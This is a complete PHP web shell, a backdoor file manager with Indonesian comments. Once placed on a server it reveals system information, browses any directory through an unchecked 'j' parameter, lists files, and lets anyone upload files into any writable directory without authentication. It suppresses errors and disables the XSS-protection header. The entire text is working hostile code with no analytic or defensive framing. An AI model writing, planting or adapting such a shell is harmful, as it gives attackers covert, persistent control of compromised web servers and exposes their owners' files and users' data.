<?php 
header("X-XSS-Protection: 0");
@ob_start();
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors', 0);

echo '<html><center><body>';
echo "<font color='green'>" . php_uname() . "</font>";
echo '<br><br>';

$currentDir = isset($_GET['j']) ? $_GET['j'] : getcwd();
$currentDir = str_replace('\\', '/', $currentDir);
$paths = explode('/', $currentDir);

// Menampilkan path direktori
foreach($paths as $id => $pat){
    if($pat == '' && $id == 0){
        echo '<a href="?j=/">/</a>';
        continue;
    }
    if($pat == '') continue;
    echo '<a href="?j=';
    for($i = 0; $i <= $id; $i++){
        echo "$paths[$i]";
        if($i != $id) echo "/";
    }
    echo '">'.$pat.'</a>/';
}

echo '<br><br><br>';
echo '<form enctype="multipart/form-data" method="POST">';
echo '<input type="file" name="file" required />';
echo '<input type="submit" value="Upload" />';
echo '</form>';

if(isset($_FILES['file'])){
    $uploadPath = $currentDir . '/' . $_FILES['file']['name'];
    if(@move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)){
        // Set file permissions to readable
        @chmod($uploadPath, 0644);
        echo '<br><font color="green">File uploaded successfully</font><br/>';
    } else {
        echo '<br><font color="red">Failed to upload the file</font><br/>';
    }
}

echo '<br>Current Directory: ' . htmlspecialchars($currentDir);
echo '<br><br>';

$scandir = @scandir($currentDir);

if ($scandir) {
    echo '<table border="1" cellpadding="3" cellspacing="1" align="center">';
    echo '<tr><th>Type</th><th>Name</th><th>Size</th><th>Actions</th></tr>';
    
    // Menampilkan direktori
    foreach($scandir as $item){
        if(@is_dir("$currentDir/$item") && $item != '.' && $item != '..'){
            echo "<tr>";
            echo '<td>Directory</td>';
            echo "<td><a href=\"?j=$currentDir/$item\">$item</a></td>";
            echo '<td></td>';
            echo '<td></td>';
            echo "</tr>";
        }
    }

    // Menampilkan file
    foreach($scandir as $item){
        if(@is_file("$currentDir/$item")){
            $size = @filesize("$currentDir/$item") / 1024;
            $size = round($size, 2) . ' KB';
            echo "<tr>";
            echo '<td>File</td>';
            echo "<td><a href=\"?filesrc=$currentDir/$item&j=$currentDir\">$item</a></td>";
            echo "<td>$size</td>";
            echo '<td></td>';
            echo "</tr>";
        }
    }

    echo '</table>';
} else {
    echo '<br><font color="red">Unable to access directory</font><br/>';
}

echo '</center></body></html>';

?>
